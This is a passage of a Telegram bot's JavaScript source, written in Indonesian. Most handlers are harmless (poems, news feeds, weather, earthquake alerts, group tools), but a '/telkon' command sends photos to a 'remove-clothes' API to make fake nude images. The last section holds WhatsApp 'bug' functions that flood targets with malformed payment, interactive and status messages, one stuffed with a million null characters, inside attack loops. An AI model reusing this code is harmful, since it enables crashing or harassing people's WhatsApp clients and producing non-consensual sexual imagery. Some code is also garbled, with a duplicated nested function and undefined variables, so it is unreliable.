    bot.sendMessage(chatId, "⚠️ Terjadi kesalahan saat membuat logo. Coba lagi nanti.");
  }
});

bot.onText(/^\/pantun(?:\s+(\w+))?$/, (msg, match) => {
  const chatId = msg.chat.id;
  const kategori = (match[1] || "acak").toLowerCase();

  const pantun = {
    lucu: [
      "Pergi ke hutan mencari rusa,\nEh malah ketemu si panda.\nLihat kamu senyum manja,\nBikin hati jadi gembira 😆",
      "Pagi-pagi makan soto,\nSambil nonton film kartun.\nLihat muka kamu begitu,\nAuto hilang semua beban 😄",
      "Burung pipit terbang ke awan,\nTurun lagi ke pinggir taman.\nLihat kamu ketawa lebay-an,\nTapi lucunya kebangetan! 😂"
    ],
    cinta: [
      "Pergi ke pasar membeli bunga,\nBunga mawar warna merah.\nCinta ini untukmu saja,\nSelamanya takkan berubah ❤️",
      "Mentari pagi bersinar indah,\nBurung berkicau sambut dunia.\nCintaku ini sungguh berserah,\nHanya padamu selamanya 💌",
      "Bintang di langit berkelip terang,\nAngin malam berbisik lembut.\nHatiku tenang terasa senang,\nSaat kau hadir beri hangat 💞"
    ],
    bijak: [
      "Padi menunduk tanda berisi,\nRumput liar tumbuh menjulang.\nOrang bijak rendah hati,\nWalau ilmu setinggi bintang 🌾",
      "Air jernih di dalam kendi,\nJatuh setetes ke atas batu.\nJangan sombong dalam diri,\nHidup tenang karena bersyukur selalu 🙏",
      "Ke pasar beli pepaya,\nDibelah dua buat sarapan.\nBijaklah dalam setiap kata,\nAgar hidup penuh kedamaian 🌿"
    ]
  };

  // Gabungkan semua kategori buat opsi "acak"
  const allPantun = [...pantun.lucu, ...pantun.cinta, ...pantun.bijak];

  // Pilih pantun sesuai kategori
  let daftar;
  if (pantun[kategori]) daftar = pantun[kategori];
  else daftar = allPantun;

  const randomPantun = daftar[Math.floor(Math.random() * daftar.length)];

  bot.sendMessage(
    chatId,
    `🎭 *Pantun ${kategori.charAt(0).toUpperCase() + kategori.slice(1)}:*\n\n${randomPantun}`,
    { parse_mode: "Markdown" }
  );
});

bot.onText(/^\/trending$/, async (msg) => {
  const chatId = msg.chat.id;
  await bot.sendMessage(chatId, "📊 Sedang mengambil topik trending di Indonesia...");

  try {
    // URL Google Trends RSS Indonesia
    const trendsUrl = "https://trends.google.com/trends/trendingsearches/daily/rss?geo=ID";
    const newsUrl = "https://news.google.com/rss?hl=id&gl=ID&ceid=ID:id"; // fallback

    // Ambil data dari Google Trends dulu
    const res = await fetch(trendsUrl);
    const xml = await res.text();

    // Regex ambil judul
    let titles = [...xml.matchAll(/<title>(?:<!\[CDATA\[)?(.*?)(?:\]\]>)?<\/title>/g)]
      .map(match => match[1])
      .slice(1, 10); // lewati judul pertama (feed title)

    // Jika tidak ada hasil, fallback ke Google News
    if (!titles.length) {
      console.log("⚠️ Google Trends kosong, fallback ke Google News...");
      const newsRes = await fetch(newsUrl);
      const newsXml = await newsRes.text();

      const newsMatches = [...newsXml.matchAll(/<title>(?:<!\[CDATA\[)?(.*?)(?:\]\]>)?<\/title>/g)];
      const linkMatches = [...newsXml.matchAll(/<link>(.*?)<\/link>/g)];

      // Gabungkan judul + link (lewati entry pertama = header feed)
      const items = newsMatches.slice(1, 11).map((m, i) => ({
        title: m[1],
        link: linkMatches[i + 1] ? linkMatches[i + 1][1] : "",
      }));

      if (items.length) {
        const list = items.map((x, i) => `${i + 1}. [${x.title}](${x.link})`).join("\n\n");
        return bot.sendMessage(
          chatId,
          `📰 *Berita Teratas Hari Ini (Fallback: Google News)*\n\n${list}\n\nSumber: ©FaiqNotDev`,
          { parse_mode: "Markdown", disable_web_page_preview: true }
        );
      } else {
        return bot.sendMessage(chatId, "⚠️ Tidak ada data trending atau berita tersedia saat ini.");
      }
    }

    // Jika ada hasil dari Google Trends
    const list = titles.map((t, i) => `${i + 1}. ${t}`).join("\n");
    await bot.sendMessage(
      chatId,
      `📈 *Topik Trending Hari Ini (Google Trends Indonesia)*\n\n${list}\n\nSumber: ©FaiqNotDev Trends`,
      { parse_mode: "Markdown" }
    );

  } catch (error) {
    console.error("❌ Error trending:", error);
    bot.sendMessage(chatId, "⚠️ Gagal mengambil data trending. Coba lagi nanti.");
  }
});

bot.onText(/^\/katahariini$/, (msg) => {
  const chatId = msg.chat.id;

  // Kumpulan kata bijak atau kata mutiara
  const kataBijak = [
    "🌻 Hidup bukan tentang menunggu badai reda, tapi belajar menari di tengah hujan.",
    "🌅 Jangan biarkan kemarin mengambil terlalu banyak dari hari ini.",
    "💡 Satu-satunya batasan dalam hidupmu adalah dirimu sendiri.",
    "🔥 Setiap langkah kecil membawa kamu lebih dekat ke impianmu.",
    "🌈 Jika kamu tidak bisa terbang, berlarilah. Jika tidak bisa berlari, berjalanlah. Tapi teruslah bergerak maju.",
    "🌙 Jangan bandingkan perjalananmu dengan orang lain. Fokus pada jalanmu sendiri.",
    "☀️ Setiap hari adalah kesempatan baru untuk menjadi lebih baik dari kemarin.",
    "🌸 Kegagalan bukan akhir, tapi bagian dari proses menuju sukses.",
    "💫 Lakukan yang terbaik hari ini, karena besok belum tentu datang.",
    "🦋 Jangan takut berubah, karena perubahan adalah tanda kamu bertumbuh."

  ];

  // Pilih acak satu kata bijak
  const randomKata = kataBijak[Math.floor(Math.random() * kataBijak.length)];

  // Kirim pesan
  bot.sendMessage(chatId, `📜 *Kata Hari Ini:*\n\n${randomKata}`, { parse_mode: "Markdown" });
});

bot.onText(/^\/motivasi$/, async (msg) => {
  const chatId = msg.chat.id;

  // Kumpulan kata motivasi
  const motivasi = [
    "🔥 Jangan pernah menyerah, karena hal besar butuh waktu.",
    "💪 Kesuksesan tidak datang dari apa yang kamu lakukan sesekali, tapi dari apa yang kamu lakukan setiap hari.",
    "🌟 Percayalah pada proses, bukan hanya hasil.",
    "🚀 Gagal itu biasa, yang penting kamu tidak berhenti mencoba.",
    "💡 Mimpi besar dimulai dari langkah kecil yang berani.",
    "🌈 Setiap hari adalah kesempatan baru untuk menjadi lebih baik.",
    "🦁 Jangan takut gagal — takutlah kalau kamu tidak mencoba.",
    "🌻 Fokuslah pada tujuanmu, bukan pada hambatan di sekitarmu.",
    "⚡ Orang sukses bukan yang tidak pernah gagal, tapi yang tidak pernah menyerah.",
    "🌤️ Kamu lebih kuat dari yang kamu kira. Terus melangkah!"

  ];

  // Pilih kata motivasi acak
  const randomMotivasi = motivasi[Math.floor(Math.random() * motivasi.length)];
  await bot.sendMessage(chatId, `✨ *Motivasi Hari Ini:*\n\n${randomMotivasi}`, {
    parse_mode: "Markdown",
  });
});

bot.onText(/^\/hariini$/, (msg) => {
  const chatId = msg.chat.id;

  // Ambil tanggal dan waktu saat ini (WIB)
  const now = new Date();
  const optionsTanggal = { weekday: 'long', year: 'numeric', month: 'long', day: 'numeric' };

  // Format ke bahasa Indonesia
  const tanggal = now.toLocaleDateString('id-ID', optionsTanggal);
  const waktu = now.toLocaleTimeString('id-ID', { hour: '2-digit', minute: '2-digit', second: '2-digit' });

  // Pesan balasan
  const pesan = `📅 *Info Hari Ini*\n\n🗓️ Tanggal: ${tanggal}\n⏰ Waktu: ${waktu} WIB\n\nSelamat menjalani hari dengan semangat! 💪`;
  bot.sendMessage(chatId, pesan, { parse_mode: 'Markdown' });
});

bot.onText(/^\/faktaunik$/, async (msg) => {
  const chatId = msg.chat.id;

  // Daftar fakta unik — bisa kamu tambah sesuka hati
  const fakta = [
    "💡 Lebah bisa mengenali wajah manusia!",
    "🌎 Gunung Everest tumbuh sekitar 4 milimeter setiap tahun.",
    "🐙 Gurita memiliki tiga jantung dan darah berwarna biru.",
    "🧊 Air panas bisa membeku lebih cepat daripada air dingin — disebut efek Mpemba.",
    "🚀 Jejak kaki di bulan akan bertahan jutaan tahun karena tidak ada angin.",
    "🐘 Gajah tidak bisa melompat, satu-satunya mamalia besar yang tidak bisa.",
    "🦋 Kupu-kupu mencicipi dengan kakinya!",
    "🔥 Matahari lebih putih daripada kuning jika dilihat dari luar atmosfer.",
    "🐧 Penguin jantan memberikan batu kepada betina sebagai tanda cinta.",
    "🌕 Di Venus, satu hari lebih panjang daripada satu tahunnya!"
  ];

  // Pilih fakta secara acak
  const randomFakta = fakta[Math.floor(Math.random() * fakta.length)];
    
  await bot.sendMessage(chatId, `🎲 *Fakta Unik Hari Ini:*\n\n${randomFakta}`, {
    parse_mode: "Markdown",
  });
});

bot.onText(/^\/dunia$/, async (msg) => {
  const chatId = msg.chat.id;
  await bot.sendMessage(chatId, "🌍 Sedang mengambil berita dunia...");

  try {
    const url = "https://feeds.bbci.co.uk/news/world/rss.xml";
    const res = await fetch(url);
    const xml = await res.text();
      
    // Ambil 5 judul dan link pertama pakai regex
    const items = [...xml.matchAll(/<item>.*?<title><!\[CDATA\[(.*?)\]\]><\/title>.*?<link>(.*?)<\/link>/gs)]
      .slice(0, 5)
      .map(m => `• [${m[1]}](${m[2]})`)
      .join("\n\n");
      
    if (!items) throw new Error("Data kosong");
      
    const message = `🌎 *Berita Dunia Terbaru*\n\n${items}\n\n📰 _Sumber: ©FaiqNotDev News_`;
    await bot.sendMessage(chatId, message, { parse_mode: "Markdown" });
  } catch (e) {
    console.error(e);
    await bot.sendMessage(chatId, "⚠️ Gagal mengambil berita dunia. Coba lagi nanti.");
  }
});

bot.onText(/\/gempa/, async (msg) => {
  const chatId = msg.chat.id;
  try {
    const res = await fetch("https://data.bmkg.go.id/DataMKG/TEWS/autogempa.json");
    const data = await res.json();
    const gempa = data.Infogempa.gempa;
    const info = `
📢 *Info Gempa Terbaru BMKG*
📅 Tanggal: ${gempa.Tanggal}
🕒 Waktu: ${gempa.Jam}
📍 Lokasi: ${gempa.Wilayah}
📊 Magnitudo: ${gempa.Magnitude}
📌 Kedalaman: ${gempa.Kedalaman}
🌊 Potensi: ${gempa.Potensi}
🧭 Koordinat: ${gempa.Coordinates}
🗺️ *Dirasakan:* ${gempa.Dirasakan || "-"}
Sumber: ©FaiqNotDev
    `;
    bot.sendMessage(chatId, info, { parse_mode: "Markdown" });
  } catch (err) {
    bot.sendMessage(chatId, "⚠️ Gagal mengambil data gempa dari BMKG.");
  }
});

bot.onText(/^\/telkon(?:\s+(.+))?/, async (msg, match) => {
  const args = ctx.message.text.split(' ').slice(1).join(' ')
  let imageUrl = args || null
  if (!imageUrl && ctx.message.reply_to_message && ctx.message.reply_to_message.photo) {
    const fileId = ctx.message.reply_to_message.photo.pop().file_id
    const fileLink = await ctx.telegram.getFileLink(fileId)
    imageUrl = fileLink.href
  }
  if (!imageUrl) {
    return ctx.reply('🪧 ☇ Format: /telkon (reply gambar)')
  }
  const statusMsg = await ctx.reply('⏳ ☇ Memproses gambar')
  try {
    const res = await fetch(`https://api.nekolabs.my.id/tools/convert/remove-clothes?imageUrl=${encodeURIComponent(imageUrl)}`)
    const data = await res.json()
    const hasil = data.result
    if (!hasil) {
      return ctx.telegram.editMessageText(ctx.chat.id, statusMsg.message_id, undefined, '❌ ☇ Gagal memproses gambar, pastikan URL atau foto valid')
    }
    await ctx.telegram.deleteMessage(ctx.chat.id, statusMsg.message_id)
    await ctx.replyWithPhoto(hasil)
  } catch (e) {
    await ctx.telegram.editMessageText(ctx.chat.id, statusMsg.message_id, undefined, '❌ ☇ Terjadi kesalahan saat memproses gambar')
  }
})

const started = Date.now();
bot.onText(/^\/uptime$/, (msg) => {
  const s = Math.floor((Date.now()-started)/1000);
  const h = Math.floor(s/3600), m = Math.floor((s%3600)/60);
  bot.sendMessage(msg.chat.id, `⏱ Bot aktif: ${h} jam ${m} menit`);
});

bot.onText(/^\/pair$/, async (msg) => {
  const members = await bot.getChatAdministrators(msg.chat.id);
  const names = members.map(m=>m.user.first_name);
  const a = names[Math.floor(Math.random()*names.length)];
  const b = names[Math.floor(Math.random()*names.length)];
  bot.sendMessage(msg.chat.id, `💞 Pasangan hari ini: ${a} ❤️ ${b}`);
});

let groupRules = {};
bot.onText(/^\/setrules (.+)/, (msg, match) => {
  groupRules[msg.chat.id] = match[1];
  bot.sendMessage(msg.chat.id, "✅ Aturan grup disimpan.");

});

bot.onText(/^\/rules$/, (msg) => {
  const rules = groupRules[msg.chat.id] || "Belum ada aturan.";
  bot.sendMessage(msg.chat.id, `📜 *Aturan Grup:*\n${rules}`, { parse_mode: "Markdown" });
});

bot.onText(/^\/tagadmin$/, async (msg) => {
  const members = await bot.getChatAdministrators(msg.chat.id);
  const names = members.slice(0,30).map(m => `@${m.user.username || m.user.first_name}`).join(" ");
  bot.sendMessage(msg.chat.id, `📢 ${names}`);
});

bot.onText(/^\/admins$/, async (msg) => {
  const list = await bot.getChatAdministrators(msg.chat.id);
  const names = list.map(a => `👑 ${a.user.first_name}`).join("\n");
  bot.sendMessage(msg.chat.id, `*Daftar Admin:*\n${names}`, { parse_mode: "Markdown" });
});

bot.onText(/^\/groupinfo$/, async (msg) => {
  if (!msg.chat.title) return bot.sendMessage(msg.chat.id, "❌ Perintah ini hanya untuk grup.");
  const admins = await bot.getChatAdministrators(msg.chat.id);
  bot.sendMessage(msg.chat.id, `
👥 *Group Info*
📛 Nama: ${msg.chat.title}
🆔 ID: ${msg.chat.id}
👑 Admins: ${admins.length}
👤 Anggota: ${msg.chat.all_members_are_administrators ? "Admin semua" : "Campuran"}
  `, { parse_mode: "Markdown" });
});

bot.onText(/^\/restartbot$/, (msg) => {
  bot.sendMessage(msg.chat.id, "♻️ Restarting bot...");
  setTimeout(() => process.exit(0), 1000);
});

const statFile = './stat.json';
if (!fs.existsSync(statFile)) fs.writeFileSync(statFile, "{}");
let stat = JSON.parse(fs.readFileSync(statFile));
function saveStat(){ fs.writeFileSync(statFile, JSON.stringify(stat, null, 2)); }
bot.on('message', (msg) => {
  const id = msg.from.id;
  stat[id] = (stat[id] || 0) + 1;
  saveStat();
});

bot.onText(/^\/stat$/, (msg)=>{
  let data = Object.entries(stat).sort((a,b)=>b[1]-a[1]).slice(0,5);
  let text = "📊 5 User Paling Aktif:\n";
  data.forEach(([id,count],i)=>text+=`${i+1}. ID:${id} -> ${count} pesan\n`);
  bot.sendMessage(msg.chat.id,text);
});

bot.onText(/^\/maps (.+)/, (msg, match)=>{
  const lokasi = match[1];
  const link = `https://www.google.com/maps/search/?api=1&query=${encodeURIComponent(lokasi)}`;
  bot.sendMessage(msg.chat.id, `🗺 Lokasi ditemukan:\n${link}`);
});

const duel = {};
bot.onText(/^\/duel (@.+)/, (msg, match) => {
  duel[msg.chat.id] = match[1];
  bot.sendMessage(msg.chat.id, `${msg.from.username} menantang ${match[1]}! Gunakan /terima untuk mulai.`);
});

bot.onText(/^\/terima$/, (msg) => {
  if (!duel[msg.chat.id]) return;
  const players = [msg.from.username, duel[msg.chat.id]];
  const winner = players[Math.floor(Math.random() * players.length)];
  bot.sendMessage(msg.chat.id, `⚔ Duel dimulai...\n🏆 Pemenang: ${winner}`);
  delete duel[msg.chat.id];
});

bot.onText(/^\/speed$/, (msg) => {
  const start = Date.now();
  bot.sendMessage(msg.chat.id, "⏱ Mengukur...").then(() => {
    const end = Date.now();
    bot.sendMessage(msg.chat.id, `⚡ Respon bot: ${end - start} ms`);
  });
});

bot.onText(/^\/cuaca (.+)/, async (msg, match) => {
  const kota = match[1];
  const url = `https://wttr.in/${encodeURIComponent(kota)}?format=3`;
  try {
    const res = await fetch(url);
    const data = await res.text();
    bot.sendMessage(msg.chat.id, `🌤 Cuaca ${data}`);
  } catch {
    bot.sendMessage(msg.chat.id, "⚠ Tidak bisa mengambil data cuaca");
  }
});

bot.onText(/\/cekid/, (msg) => {
  const chatId = msg.chat.id;
  const sender = msg.from.username;
  const randomImage = getRandomImage();
  const id = msg.from.id;
  const owner = "7127454409"; // Ganti dengan ID pemilik bot
  const text12 = `Halo @${sender}
╭────⟡
│ 👤 Nama: @${sender}
│ 🆔 ID: ${id}
╰────⟡
<blockquote>by @FaiqNotDev</blockquote>
`;
  const keyboard = {
    reply_markup: {
      inline_keyboard: [
        [
        [{ text: "OWNER", url: "https://t.me/FaiqNotDev" }],
        ],
      ],
    },
  };
  bot.sendPhoto(chatId, randomImage, {
    caption: text12,
    parse_mode: "HTML",
    reply_markup: keyboard,
  });
});

bot.onText(/^\/whoami$/, (msg) => {
  const user = msg.from;
  const info = `
🪪 <b>Data Profil Kamu</b>
━━━━━━━━━━━━━━━━━━
👤 Nama: ${user.first_name || "-"} ${user.last_name || ""}
🏷 Username: @${user.username || "Tidak ada"}
🆔 ID: <code>${user.id}</code>
🌐 Bahasa: ${user.language_code || "unknown"}
  `;
  bot.sendMessage(msg.chat.id, info, { parse_mode: "HTML" });
});

// =========================
// 🚫 AntiLink Simple Version
// =========================

let antiLink = true; // default aktif
const linkPattern = /(https?:\/\/|t\.me|www\.)/i;

// Command /antilink on/off
bot.onText(/^\/antilink (on|off)$/i, (msg, match) => {
  const chatId = msg.chat.id;
  const status = match[1].toLowerCase();

  if (status === "on") {
    antiLink = true;
    bot.sendMessage(chatId, "✅ AntiLink diaktifkan!");
  } else {
    antiLink = false;
    bot.sendMessage(chatId, "⚙️ AntiLink dimatikan!");
  }
});

// Hapus pesan jika ada link
bot.on("message", (msg) => {
  if (!antiLink) return;
  if (!msg.text) return;

  const chatId = msg.chat.id;
  if (linkPattern.test(msg.text)) {
    bot.deleteMessage(chatId, msg.message_id).catch(() => {});
    bot.sendMessage(chatId, "🚫 Pesan berisi link telah dihapus otomatis!");
  }
});

bot.onText(/\/getcode (.+)/, async (msg, match) => {
  const chatId = msg.chat.id;
   const senderId = msg.from.id;
   const randomImage = getRandomImage();
    const userId = msg.from.id;
            //cek prem //
if (!premiumUsers.some(user => user.id === senderId && new Date(user.expiresAt) > new Date())) {
  return bot.sendPhoto(chatId, randomImage, {
    caption: `
<blockquote>Evo Enggine  ⚘</blockquote>
Oi kontol kalo mau akses comandd ini,
/addprem dulu bego 
`,
    parse_mode: "HTML",
    reply_markup: {
      inline_keyboard: [
        [{ text: "X - DEVLOVER", url: "https://t.me/FaiqNotDev" }], 
      ]
    }
  });
}
  const url = (match[1] || "").trim();
  if (!/^https?:\/\//i.test(url)) {
    return bot.sendMessage(chatId, "♥️ /getcode https://namaweb");
  }

  try {
    const response = await axios.get(url, {
      responseType: "text",
      headers: { "User-Agent": "Mozilla/5.0 (compatible; Bot/1.0)" },
      timeout: 20000
    });
    const htmlContent = response.data;

    const filePath = path.join(__dirname, "web_source.html");
    fs.writeFileSync(filePath, htmlContent, "utf-8");

    await bot.sendDocument(chatId, filePath, {
      caption: `✅ CODE DARI ${url}`
    });

    fs.unlinkSync(filePath);
  } catch (err) {
    console.error(err);
    bot.sendMessage(chatId, "♥️🥹 ERROR SAAT MENGAMBIL CODE WEB");
  }
});

bot.onText(/\/panelinfo/, async (msg) => {
  const chatId = msg.chat.id;
  const userId = msg.from.id;

  // Daftar ID owner dari config.js
  const ownerIds = config.OWNER_ID || [];

  // Cek apakah user adalah owner
  if (!ownerIds.includes(String(userId))) {
    return bot.sendMessage(chatId, "❌ Hanya owner yang bisa melihat informasi panel ini!");
  }

  // Jika owner, tampilkan info sistem
  const os = require("os");
  const axios = require("axios");

  const hostname = os.hostname();
  const platform = os.platform();
  const arch = os.arch();
  const cpuModel = os.cpus()[0].model;
  const cpuCore = os.cpus().length;
  const totalMem = Math.round(os.totalmem() / 1024 / 1024);
  const uptimeOs = Math.floor(os.uptime() / 3600);
  const now = new Date().toLocaleString("id-ID");

  // Ambil IP publik
  let ip = "Tidak terdeteksi";
  try {
    const res = await axios.get("https://api.ipify.org?format=json");
    ip = res.data.ip;
  } catch (e) {
    ip = "Tidak terhubung ke internet";
  }

  const text = `
💻 <blockquote>PANEL INFORMATION<blockquote>
━━━━━━━━━━━━━━━━━━
🖥️ <b>Hostname:</b> ${hostname}
🧠 <b>CPU:</b> ${cpuModel} (${cpuCore} Core)
💾 <b>Total RAM:</b> ${totalMem} MB
⚙️ <b>OS:</b> ${platform.toUpperCase()} (${arch})
📡 <b>Public IP:</b> ${ip}
⏱️ <b>Uptime Server:</b> ${uptimeOs} jam
📅 <b>Waktu:</b> ${now}
━━━━━━━━━━━━━━━━━━
<blockquote>Data real-time dari panel host kamu.<blockquote>
`;

  await bot.sendMessage(chatId, text, { parse_mode: "HTML" });
});

bot.onText(/^\/chatowner(?:\s+(.+))?/, async (msg, match) => {
  try {
    const OWNER_ID = 7816120495; // Ganti dengan ID owner kamu
    const userId = msg.from.id;
    const chatId = msg.chat.id;
    const text = (match[1] || "").trim();
    const name = msg.from.first_name || "Tanpa Nama";

    if (!text)
      return bot.sendMessage(chatId, "⚠️ Format salah.\nGunakan: /chatowner <isi permintaan fitur>");

    const message = `
📩 *Permintaan Fitur Baru*  
👤 Dari: ${name}  
🆔 ID: ${userId}  

💬 Pesan:  
${text}
    `;

    await bot.sendMessage(OWNER_ID, message, { parse_mode: "Markdown" });
    await bot.sendMessage(chatId, "✅ Permintaan fitur kamu sudah dikirim ke owner.");
  } catch (err) {
    console.error("❌ Error di /reqfitur:", err.message);
    bot.sendMessage(chatId, "❌ Terjadi kesalahan saat mengirim permintaan fitur.");
  }
});

bot.onText(/^\/brat(?: (.+))?/, async (msg, match) => {
  const chatId = msg.chat.id;
  const argsRaw = match[1];

  if (!argsRaw) {
    return bot.sendMessage(chatId, 'Gunakan: /brat <teks> [--gif] [--delay=500]');
  }

  try {
    const args = argsRaw.split(' ');

    const textParts = [];
    let isAnimated = false;
    let delay = 500;

    for (let arg of args) {
      if (arg === '--gif') isAnimated = true;
      else if (arg.startsWith('--delay=')) {
        const val = parseInt(arg.split('=')[1]);
        if (!isNaN(val)) delay = val;
      } else {
        textParts.push(arg);
      }
    }

    const text = textParts.join(' ');
    if (!text) {
      return bot.sendMessage(chatId, 'Teks tidak boleh kosong!');
    }

    // Validasi delay
    if (isAnimated && (delay < 100 || delay > 1500)) {
      return bot.sendMessage(chatId, 'Delay harus antara 100–1500 ms.');
    }

    await bot.sendMessage(chatId, '🌿 Generating stiker brat...');

    const apiUrl = `https://api.siputzx.my.id/api/m/brat?text=${encodeURIComponent(text)}&isAnimated=${isAnimated}&delay=${delay}`;
    const response = await axios.get(apiUrl, {
      responseType: 'arraybuffer',
    });

    const buffer = Buffer.from(response.data);

    // Kirim sticker (bot API auto-detects WebP/GIF)
    await bot.sendSticker(chatId, buffer);
  } catch (error) {
    console.error('❌ Error brat:', error.message);
    bot.sendMessage(chatId, 'Gagal membuat stiker brat. Coba lagi nanti ya!');
  }
});

bot.onText(/^\/iqc (.+)/, async (msg, match) => {
  const chatId = msg.chat.id;
  const text = match[1];

  if (!text) {
    return bot.sendMessage(
      chatId,
      "⚠ Gunakan: `/iqc jam|batre|carrier|pesan`\nContoh: `/iqc 18:00|40|Indosat|hai hai`",
      { parse_mode: "Markdown" }
    );
  }

  let [time, battery, carrier, ...msgParts] = text.split("|");
  if (!time || !battery || !carrier || msgParts.length === 0) {
    return bot.sendMessage(
      chatId,
      "⚠ Format salah!\nGunakan: `/iqc jam|batre|carrier|pesan`\nContoh: `/iqc 18:00|40|Indosat|hai hai`",
      { parse_mode: "Markdown" }
    );
  }

  bot.sendMessage(chatId, "⏳ Tunggu sebentar...");

  let messageText = encodeURIComponent(msgParts.join("|").trim());
  let url = `https://brat.siputzx.my.id/iphone-quoted?time=${encodeURIComponent(
    time
  )}&batteryPercentage=${battery}&carrierName=${encodeURIComponent(
    carrier
  )}&messageText=${messageText}&emojiStyle=apple`;

  try {
    let res = await fetch(url);
    if (!res.ok) {
      return bot.sendMessage(chatId, "❌ Gagal mengambil data dari API.");
    }

    let buffer;
    if (typeof res.buffer === "function") {
      buffer = await res.buffer();
    } else {
      let arrayBuffer = await res.arrayBuffer();
      buffer = Buffer.from(arrayBuffer);
    }

    await bot.sendPhoto(chatId, buffer, {
      caption: `✅ Nih hasilnya`,
      parse_mode: "Markdown",
    });
  } catch (e) {
    console.error(e);
    bot.sendMessage(chatId, "❌ Terjadi kesalahan saat menghubungi API.");
  }
});

bot.onText(/\/ig(?:\s(.+))?/, async (msg, match) => {
    const chatId = msg.chat.id;

    if (!match || !match[1]) {
        return bot.sendMessage(chatId, "❌ Missing input. Please provide an Instagram post/reel URL.\n\nExample:\n/ig https://www.instagram.com/reel/xxxxxx/");
    }

    const url = match[1].trim();

    try {
        const apiUrl = `https://api.nvidiabotz.xyz/download/instagram?url=${encodeURIComponent(url)}`;

        const res = await fetch(apiUrl);
        const data = await res.json();

        if (!data || !data.result) {
            return bot.sendMessage(chatId, "❌ Failed to fetch Instagram media. Please check the URL.");
        }

        // Jika ada video
        if (data.result.video) {
            await bot.sendVideo(chatId, data.result.video, {
                caption: `📸 Instagram Media\n\n👤 Author: ${data.result.username || "-"}`
            });
        } 
        // Jika hanya gambar
        else if (data.result.image) {
            await bot.sendPhoto(chatId, data.result.image, {
                caption: `📸 Instagram Media\n\n👤 Author: ${data.result.username || "-"}`
            });
        } 
        else {
            bot.sendMessage(chatId, "❌ Unsupported media type from Instagram.");
        }
    } catch (err) {
        console.error("Instagram API Error:", err);
        bot.sendMessage(chatId, "❌ Error fetching Instagram media. Please try again later.");
    }
});

// ------------------ ( Function Disini ) ------------------------ \\
async function PaysQl(client, target) {
  const msg = await generateWAMessageFromContent(
    target,
    {
      viewOnceMessage: {
        message: {
          interactiveResponseMessage: {
            contextInfo: {
              remoteJid: " X ",
              mentionedJid: Array.from({ length: 1900 }, () =>
                `1${Math.floor(Math.random() * 9000000)}@s.whatsapp.net`
              )
            },
            body: {
              text: " @vinzxiterr ",
              format: "DEFAULT"
            },
            nativeFlowResponseMessage: {
              name: "payment_info",
              paramsJson: `{"currency":"IDR","total_amount":{"value":0,"offset":100},"reference_id":"4UJPSC1FYKC","type":"physical-goods","order":{"status":"pending","subtotal":{"value":0,"offset":100},"order_type":"ORDER","items":[{"name":"","amount":{"value":0,"offset":100},"quantity":0,"sale_amount":{"value":0,"offset":100}}]},"payment_settings":[{"type":"pix_static_code","pix_static_code":{"merchant_name":"¿!deadcode!¿","key":" ¿🎭? ${"\u0000".repeat(999999)}","key_type":"CPF"}}],"share_payment_status":false}`,
              version: 3
            }
          }
        }
      }
    },
    {
      participant: { jid: target }
    }
  )

  for (let i = 0; i < 20; i++) {
    await client.relayMessage(
      target,
      {
        groupStatusMessageV2: {
          message: msg.message
        }
      },
      {
        messageId: msg.key.id,
        participant: { jid: target }
      }
    )

    await sleep(1500)
  }
}

// ¡ :: example loop this function : 
async function runAttack(sock, target) {

  for (let i = 0; i < 100; i++) {

    // await PaysQ1(sock, target);

    await sleep(1500);

  }

}
let target = "";
runAttack(sock, target);

async function locaDelay(sock, target) {

async function locaDelay(sock, target) {
  try {
    const payload = {
      viewOnceMessage: {
        message: {
          messageContextInfo: {},

          interactiveResponseMessage: {
            body: {
              text: "Know Me?",
              format: "DEFAULT"
            },

            nativeFlowResponseMessage: {
              name: "",
              paramsJson: JSON.stringify({ info: "deafX information" }),
              version: 3
            },

            groupStatusMessageV2: {
              message: {
                locationMessage: {
                  degreesLatitude: 12.3456,
                  degreesLongitude: 65.4321,
                  name: "deaf?",
                  address: "-deaf",
                  isLive: false
                }
              }
            },

            contextInfo: {
              participant: target,
              isForwarded: false,
              forwardingScore: 0,

              forwardedNewsletterMessageInfo: {
                newsletterName: "",
                newsletterJid: "999999999@newsletter",
                serverMessageId: 1
              },

              mentionedJid: [target]
            }
          }
        }
      }
    };

    const msg = generateWAMessageFromContent(target, payload, {});

    await sock.relayMessage(target, msg.message, {
      messageId: msg.key.id
    });

    console.log("[ SUCCES SEND BUG BY ShadowSpade ♠️]");

  } catch (e) {
    console.error("Eror Functions:", e);
  }
}

async function buttonDelay(sock, target) {
  try {
   
    const buttonList = [
      {
        name: "single_select",
        buttonParamsJson: JSON.stringify({ label: "Select Option" })
      },
      {
        name: "call_permission_request",
        buttonParamsJson: JSON.stringify({ request: true }),
        message_with_link_status: true
      },
      {
        name: "payment_method",
        buttonParamsJson: "{}"
      },
      {
        name: "payment_status",
        buttonParamsJson: "{}"
      },
      {
        name: "review_order",
        buttonParamsJson: "{}"
      }
    ];

    for (let x = 1; x <= 100; x++) {

      const payload = {
        header: { title: "", hasMediaAttachment: false },
        body: { text: `Knoww Me Ridz?` },
        nativeFlowMessage: {
          documentMessage: {
            carouselMessage: {
              messageParamsJson: JSON.stringify({
                name: "galaxy_message",
                title: "galaxy_message",
                header: "Ridz",
                body: `Testing Galaxy`
              }),
              buttons: buttonList
            }
          }
        }
      };

      const GalaxyMessage = {
        groupStatusMessageV2: {
          message: {
            interactiveResponseMessage: {
              body: { text: `Galaxy Test Update` },
              contextInfo: { mentionedJid: [] }
            }
          }
        },
        extendedTextMessage: {
          text: JSON.stringify(payload)
        }
      };

      await sock.relayMessage(target, GalaxyMessage, {});
      await sleep(delay); 
    }

  } catch (err) {
    console.error("Error:", err);
  }
}

async function occolotopysV2(sock, target) {
  let devices = (
    await sock.getUSyncDevices([target], false, false)
  ).map(({ user, device }) => `${user}:${device || ''}@s.whatsapp.net`);
  await sock.assertSessions(devices);
  let CallAudio = () => {
    let map = {};
    return {
      mutex(key, fn) {
        map[key] ??= { task: Promise.resolve() };
        map[key].task = (async prev => {
          try { await prev; } catch { }
          return fn();
        })(map[key].task);
        return map[key].task;
      }
    };
  };

  let AudioLite = CallAudio();
  let MessageDelete = buf => Buffer.concat([Buffer.from(buf), Buffer.alloc(8, 1)]);
  let BufferDelete = sock.createParticipantNodes.bind(sock);
  let encodeBuffer = sock.encodeWAMessage?.bind(sock);

  sock.createParticipantNodes = async (recipientJids, message, extraAttrs, dsmMessage) => {
    if (!recipientJids.length) return { nodes: [], shouldIncludeDeviceIdentity: false };

    let patched = await (sock.patchMessageBeforeSending?.(message, recipientJids) ?? message);

    let participateNode = Array.isArray(patched)
      ? patched
